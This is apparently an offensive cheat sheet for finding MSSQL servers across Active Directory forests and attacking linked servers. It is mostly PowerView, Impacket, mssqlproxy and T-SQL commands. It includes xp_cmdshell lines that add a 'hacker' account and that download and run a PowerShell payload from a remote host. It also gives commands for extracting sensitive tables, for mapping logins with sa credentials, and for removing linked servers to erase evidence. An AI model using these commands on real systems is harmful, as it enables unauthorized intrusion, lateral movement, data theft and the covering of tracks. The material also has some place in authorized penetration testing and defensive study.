
To find MSSQL servers across different Active Directory (AD) forests and determine if they are linked, you can use a combination of **PowerView**, **PowerShell**, **CMD**, and other enumeration tools. Below are commands and techniques for discovering MSSQL servers and identifying linked servers.

### 1. **Using PowerView (PowerShell)**
**PowerView** is a popular tool for enumerating AD environments. You can use it to discover MSSQL servers and explore possible forest trust relationships.

#### Discovering MSSQL Servers:
```powershell
# List all SQL Server service principal names (SPNs) registered in the domain
Get-NetComputer -Service "MSSQL*" | Select-Object Name
```
This command will list computers with SQL Server SPNs registered, indicating they are likely running SQL services. Look for SPNs starting with `MSSQLSvc` for SQL Server instances.

#### Finding Forest Trusts:
```powershell
# Enumerate all trusts in the domain (cross-forest trust)
Get-NetForestTrust
```

#### Using `Find-LocalAdminAccess` to Find MSSQL Servers:
```powershell
# Find machines where the current user has local admin access, which may include SQL Servers
Find-LocalAdminAccess
```

### 2. **Using PowerShell Without PowerView**
If you don't have access to PowerView, you can use built-in PowerShell commands to query Active Directory for MSSQL services.

#### Find SQL Server SPNs:
```powershell
# Query Active Directory for MSSQL SPNs
Get-ADComputer -Filter {ServicePrincipalName -like "*MSSQL*"} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
```

This command will query Active Directory for computers with SQL Server SPNs registered and display their service names.

### 3. **Using CMD for SPN Enumeration**
If you need to enumerate MSSQL servers via the command line (CMD), you can use **setspn** to list registered SPNs in the current domain.

```cmd
# List SQL Server SPNs in the domain
setspn -T <domain> -Q MSSQLSvc/*
```
Replace `<domain>` with the target domain. This command will search for all MSSQL SPNs registered in Active Directory.

### 4. **Using LDAPSearch to Query AD for MSSQL Servers**
You can use **ldapsearch** to query Active Directory for MSSQL service accounts and computers. This is useful if you're working in a Linux environment or prefer using LDAP queries.

```bash
ldapsearch -x -h <domain-controller> -b "DC=domain,DC=com" "(servicePrincipalName=MSSQLSvc*)" dn
```

### 5. **Checking for Linked SQL Servers (PowerShell & T-SQL)**
Once you have access to a SQL Server, you can use **T-SQL** commands to check for linked servers and their configurations.

#### Using PowerShell to Query SQL Server:
```powershell
# Using PowerShell's SQL module to query linked servers
$linkedServers = Invoke-Sqlcmd -Query "EXEC sp_linkedservers;" -ServerInstance "<SQLServer>"
$linkedServers | Format-Table
```
This command queries the SQL Server for any linked servers defined.

#### Using T-SQL in SQL Server Management Studio (SSMS):
You can directly run the following commands in SSMS to find linked servers:

```sql
-- List linked servers
EXEC sp_linkedservers;

-- Get more details about linked servers
SELECT * FROM sys.servers;
```

### 6. **Using Impacket's mssqlclient.py to Query Linked Servers**
Impacket’s `mssqlclient.py` is a useful tool for connecting to SQL Servers and querying linked servers.

```bash
# Connect to a SQL server using Impacket
mssqlclient.py domain/user@sql-server-ip -windows-auth

# Run a query to list linked servers
EXEC sp_linkedservers;
```

### 7. **Using PowerShell to Enumerate Linked Servers via SQL Server**
If you already have access to a SQL Server instance, you can use PowerShell to enumerate linked servers and check for delegation configurations.

```powershell
# Enumerate linked servers
Invoke-Sqlcmd -Query "SELECT * FROM sys.servers;" -ServerInstance "<SQLServer>"
```

### 8. **How to Check for Cross-Forest SQL Server Delegation**
If the SQL Servers use **Kerberos delegation** to enable linked server authentication across forests, you can check for delegation configurations:

```powershell
# Check for delegation (unconstrained or constrained) on a specific SQL server account
Get-ADComputer -Identity <SQLServer> -Properties msDS-AllowedToDelegateTo
```

The property `msDS-AllowedToDelegateTo` will show if delegation is configured, which could help in cross-forest attacks.

### Summary of Enumeration Commands:

| **Tool**         | **Command** / **Usage**                                      | **Purpose**                                     |
|------------------|--------------------------------------------------------------|-------------------------------------------------|
| **PowerView**    | `Get-NetComputer -Service "MSSQL*"`                           | Find MSSQL servers by SPN                       |
| **PowerShell**   | `Get-ADComputer -Filter {ServicePrincipalName -like "*MSSQL*"}` | Find MSSQL servers without PowerView            |
| **CMD**          | `setspn -T <domain> -Q MSSQLSvc/*`                            | Find MSSQL servers via SPNs in CMD              |
| **Impacket**     | `mssqlclient.py domain/user@sql-server-ip`                    | Connect to MSSQL and enumerate linked servers   |
| **T-SQL**        | `EXEC sp_linkedservers;`                                      | Enumerate linked servers via SQL Server         |
| **PowerView**    | `Get-NetForestTrust`                                          | Enumerate forest trusts                         |
| **SQL/T-SQL**    | `SELECT * FROM sys.servers;`                                  | Get details about linked SQL servers            |

By using these techniques, you can identify SQL Servers within and across forests, understand the linked server configurations, and plan attacks accordingly.


### Introduction to Linked SQL Servers in Forest Trusts

In Active Directory environments, **Linked SQL Servers** allow databases to interact across different SQL Server instances, potentially spanning across **Active Directory Forests**. These linked servers are frequently established to allow for seamless querying between SQL instances, which introduces the potential for abuse if permissions and configurations are not secured.

When **forest trusts** exist between two or more Active Directory forests, it enables a level of trust that attackers can exploit. If a user compromises a SQL server with linked server configurations, they can potentially pivot and escalate privileges across forests, making these linked servers an attractive attack target.

### Potential Abuse of Linked SQL Servers
- **Pivoting**: Using linked servers to move laterally between SQL instances or even escalate privileges across forests.
- **Data Theft**: Accessing sensitive data stored in other SQL instances.
- **Command Execution**: Abusing linked server configurations to execute commands on remote systems.
- **Kerberos Delegation Abuse**: If unconstrained delegation is configured on SQL servers, attackers can impersonate privileged accounts.

### Table 1: Key Commands for Enumerating Linked SQL Servers

| **Command/Tool**             | **Purpose**                                   | **Usage** or **Example**                                                   |
|------------------------------|-----------------------------------------------|----------------------------------------------------------------------------|
| `sp_linkedservers`            | List all linked servers on a SQL Server       | `EXEC sp_linkedservers;`                                                   |
| `sp_helpserver`               | Get detailed information about linked servers | `EXEC sp_helpserver;`                                                      |
| `xp_enumdsn`                  | Enumerate ODBC linked data sources            | `EXEC master.dbo.xp_enumdsn;`                                               |
| `SELECT * FROM OPENQUERY()`   | Query linked servers directly                 | `SELECT * FROM OPENQUERY([linked_server], 'SELECT name FROM sys.databases');` |
| `sp_serveroption`             | View specific options for linked servers      | `EXEC sp_serveroption @server='linked_server', @optname='rpc', @optvalue='true';` |
| `SELECT * FROM sys.servers`   | Query for details of local and linked servers | `SELECT * FROM sys.servers;`                                                |
| **Impacket `mssqlclient.py`** | Connect to MSSQL instance, execute queries    | `mssqlclient.py <DOMAIN>/<USER>@<TARGET> -windows-auth`                     |
| **MSSQLProxy**                | Proxy connections through linked SQL servers  | `./mssqlproxy.py -t <target> -l <local port> -U <username> -P <password>`   |

---

### Table 2: Enumeration Techniques for Linked SQL Servers

| **Technique**                           | **Purpose**                                                      | **Steps** or **Commands**                                                 |
|-----------------------------------------|------------------------------------------------------------------|---------------------------------------------------------------------------|
| **Linked Server Enumeration**           | Discover and map linked servers                                  | Use `sp_linkedservers` and `sp_helpserver` to list all linked servers.     |
| **Check Delegation Configuration**      | Identify improper Kerberos delegation (unconstrained/constrained) | Check with `sp_serveroption` for delegation-related options.               |
| **Enumerate Server Permissions**        | Find permissions you have on linked servers                      | Use `SELECT * FROM sys.database_permissions` and `sys.server_permissions`. |
| **Execute Commands via Linked Servers** | Run commands using `xp_cmdshell` or `sp_executesql` on linked SQL | `EXEC('xp_cmdshell ''whoami'') AT [linked_server];`                       |
| **Cross-Forest Data Enumeration**       | Query databases across a forest trust                            | Use `OPENQUERY` to query databases on the linked servers.                   |
| **Privilege Escalation**                | Elevate permissions via linked servers                           | Abuse permissions like `db_owner`, `sysadmin`, or execute `xp_cmdshell`.    |

---

### MSSQLProxy and Impacket Enumeration

#### **MSSQLProxy Usage**
MSSQLProxy can be used to tunnel SQL Server commands through a compromised linked SQL server. This proxying allows an attacker to use the compromised server as a pivot point into other linked servers.

```bash
# Tunnel via MSSQLProxy
./mssqlproxy.py -t <Target Linked SQL Server IP> -l <Local Port> -U <username> -P <password>
```
- **Target Linked SQL Server IP**: The IP address of the linked SQL server you want to pivot through.
- **Local Port**: The local port on your machine to tunnel through.
- **Username/Password**: Credentials for the SQL server.

Once set up, you can point SQL management tools (e.g., SQL Server Management Studio) to `localhost:<Local Port>` to interact with the remote SQL instance.

#### **Impacket `mssqlclient.py` Usage**

Impacket's `mssqlclient.py` is useful for enumerating SQL servers and executing commands. You can connect to the SQL server in the trusted domain and begin enumerating linked servers as shown below.

```bash
mssqlclient.py domain/user@remote-sql-server -windows-auth
# Enumerate linked servers
EXEC sp_linkedservers;
# Query linked server
SELECT * FROM OPENQUERY([linked_server], 'SELECT name FROM sys.databases');
```

---

### Potential Attack Paths in Forest Trusts
1. **Privilege Escalation via Linked Servers**:
   - **Scenario**: You compromise a SQL server in one forest that is linked to another forest's SQL server.
   - **Action**: Use linked server functionality (`OPENQUERY`, `xp_cmdshell`) to escalate privileges across the trust boundary.

2. **Abuse of Delegation**:
   - **Scenario**: The linked server uses unconstrained delegation, allowing impersonation of privileged accounts.
   - **Action**: Leverage `GetST` or `mimikatz` to obtain a TGT and impersonate users for cross-forest attacks.

3. **Lateral Movement**:
   - **Scenario**: A linked server in a trusted forest has misconfigured permissions.
   - **Action**: Execute arbitrary code using linked server `rpc` capabilities to move laterally between forests.

---

### Table 3: Common Enumeration and Attack Commands via Linked SQL Servers

| **Command**                                                | **Purpose**                                                        |
|------------------------------------------------------------|--------------------------------------------------------------------|
| `EXEC('whoami') AT [linked_server]`                        | Execute command on linked server                                   |
| `EXEC('xp_cmdshell ''net user /add hacker hacker123''') AT [linked_server]` | Add a user on the linked server                                    |
| `SELECT * FROM OPENQUERY([linked_server], 'SELECT name FROM sys.databases');` | List databases on the linked server                                |
| `EXEC('sp_linkedservers') AT [linked_server];`             | List linked servers on the remote linked server                    |
| `EXEC('xp_cmdshell ''powershell IEX (New-Object Net.WebClient).DownloadString(''http://192.168.1.100/payload.ps1'')''') AT [linked_server];` | Execute PowerShell payload through linked server using `xp_cmdshell` |

---

### Conclusion

Linked SQL servers in AD forest trusts provide an opportunity for attackers to pivot and escalate privileges across multiple systems. By enumerating linked servers, identifying permission misconfigurations, and abusing delegation, attackers can compromise SQL instances and Active Directory environments.

Using tools like **Impacket's mssqlclient.py** and **MSSQLProxy** can help an attacker execute commands on remote SQL servers, allowing for lateral movement across the network. **BloodHound** can also help map out SQL Server attack paths in complex forest environments.

Here's a comprehensive table of **MSSQL** commands for enumerating and attacking **linked SQL servers** across **AD forests**. These commands can be used from within **SQL Server Management Studio (SSMS)**, **Impacket’s mssqlclient.py**, **PowerShell**, or other SQL tools:


| **Command** / **Tool**                          | **Description**                                                        | **Purpose**                                        |
|-------------------------------------------------|------------------------------------------------------------------------|----------------------------------------------------|
| **`EXEC sp_linkedservers;`**                    | Enumerates all linked servers.                                          | Lists all SQL servers linked to the current server. |
| **`SELECT * FROM sys.servers;`**                | Detailed information on linked servers.                                | Fetches details like server names, product types, and data sources for linked servers. |
| **`SELECT * FROM sys.linked_logins;`**          | Shows login mappings for linked servers.                               | Enumerates linked server login accounts and their mapping. |
| **`SELECT * FROM sys.server_principals;`**      | Enumerates server-level principals, including logins.                  | Useful for identifying privileged users who can access linked servers. |
| **`SELECT * FROM sys.dm_exec_sessions;`**       | Lists current sessions on the SQL Server, including linked server sessions. | Useful for monitoring activity across linked servers. |
| **`EXEC sp_helpserver;`**                       | Provides additional configuration information about linked servers.    | Lists linked servers and additional configuration information. |
| **`EXEC sp_addlinkedsrvlogin;`**                | Adds a new login mapping for a linked server.                          | Add or manipulate linked server logins to escalate privileges. |
| **`EXEC sp_addlinkedserver @server='SQL01', @srvproduct='';`** | Creates a new linked server.                                            | Add a linked server to create lateral movement opportunities across forests. |
| **`EXEC sp_serveroption @server='SQL01', @optname='rpc out', @optvalue='true';`** | Enables RPC out for a linked server.                                    | Allows queries and commands to be executed on the remote server. |
| **`SELECT * FROM OPENQUERY([SQL01], 'SELECT @@version');`**  | Executes a query on a linked server.                                   | Check the version of the remote SQL Server via a linked server. |
| **`EXEC master..xp_cmdshell 'dir';`**           | Executes a command on the remote SQL Server.                           | Run system commands on a linked SQL server if `xp_cmdshell` is enabled. |
| **`SELECT * FROM OPENROWSET('SQLNCLI', 'Server=SQL01;Trusted_Connection=yes;', 'SELECT * FROM sys.databases');` | Query databases on a remote SQL Server via a linked server. | Enumerate databases on a linked server across a forest. |
| **`SELECT * FROM OPENQUERY([LinkedServer], 'SELECT * FROM sensitive_database.dbo.sensitive_table');`** | Query sensitive data across a linked server.                           | Extract data from remote databases via linked servers. |
| **`EXEC sp_droplinkedsrvlogin @rmtsrvname='SQL01';`**        | Remove a linked server login mapping.                                  | Delete evidence or remove access once an attack has been performed. |
| **`EXEC sp_dropserver 'SQL01', 'droplogins';`**              | Removes a linked server and associated logins.                         | Clean up after an attack by removing the linked server and its logins. |
| **`SELECT name, is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on = 1;`** | Find databases with TRUSTWORTHY set to ON.                             | Trustworthy databases can be exploited for privilege escalation, especially in cross-forest attacks. |
| **`SELECT * FROM sys.dm_exec_requests WHERE session_id > 50;`** | Check for running queries or commands on the linked server.             | Monitor active queries and commands to understand activity on linked servers. |
| **`EXEC sys.sp_configure 'remote access', 1;`**               | Enables remote access to the SQL Server.                               | Ensures remote access is possible for linked servers. |
| **`EXEC sys.sp_configure 'show advanced options', 1;`**       | Enables advanced options.                                              | Needed for enabling/disabling features like `xp_cmdshell` that can be abused. |
| **`SELECT * FROM sys.trusts WHERE trust_type = 2;`**          | Lists all trusted domains or forests in the AD environment.            | Useful for finding cross-forest trusts that may allow lateral movement to linked servers. |
| **`SELECT myuser FROM OPENQUERY(\"linked.mssql.domain.forest.com\", 'SELECT SYSTEM_USER AS myuser');`** | Enumerates the user account used to connect to the linked server.      | Useful for determining which accounts are in use across forests. |
| **`SELECT SYSTEM_USER;`**                                    | Returns the current login account for the local server.                | Identify the current user on the local SQL Server instance. |


### **Key Attack Techniques**

1. **Remote Command Execution**:
   - **Objective**: Execute system commands on a remote linked SQL server.
   - **Command**:
     ```sql
     EXEC('xp_cmdshell ''whoami''') AT [LinkedServerName];
     ```

2. **Privilege Escalation via Linked Servers**:
   - **Objective**: Gain privileged access to linked SQL Servers and escalate privileges across a forest.
   - **Command**:
     ```sql
     EXEC sp_addlinkedsrvlogin @rmtsrvname='LinkedServer', @useself='false', @locallogin=NULL, @rmtuser='sa', @rmtpassword='password';
     ```

3. **Data Exfiltration via Linked Servers**:
   - **Objective**: Query sensitive data across a linked server.
   - **Command**:
     ```sql
     SELECT * FROM OPENQUERY([LinkedServer], 'SELECT * FROM sensitive_database.dbo.sensitive_table');
     ```

4. **Abusing TRUSTWORTHY Databases**:
   - **Objective**: Elevate privileges using the TRUSTWORTHY database property across linked servers.
   - **Command**:
     ```sql
     EXECUTE AS USER = 'dbo' AT [LinkedServer];
     ```

### **Enumeration Techniques for Linked Servers in AD Forests**

1. **Use PowerView for Trust Enumeration**:
   - **Command**:
     ```powershell
     Get-NetForestTrust
     ```
   - This will enumerate trust relationships between forests, which may allow cross-forest access via linked SQL Servers.

2. **Check for Cross-Forest Constrained Delegation**:
   - **Command**:
     ```powershell
     Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like '*MSSQLSvc*'} -Properties msDS-AllowedToDelegateTo
     ```
   - This checks for accounts and servers that are configured for delegation, which could be abused in linked SQL Server attacks.

### **Tools to Use**:
- **PowerView**: For AD trust enumeration.
- **Impacket’s mssqlclient.py**: For interacting with SQL Servers and running linked server commands.
- **BloodHound**: To analyze AD environments and detect privileges or delegation that can help in cross-forest linked SQL server attacks.

### **Conclusion**:
Using these commands, you can enumerate and attack linked SQL Servers across AD forests, exploiting SQL Server configurations, delegation, and other misconfigurations. Focus on finding linked servers, privileged accounts, and trust relationships that can help you escalate privileges across environments.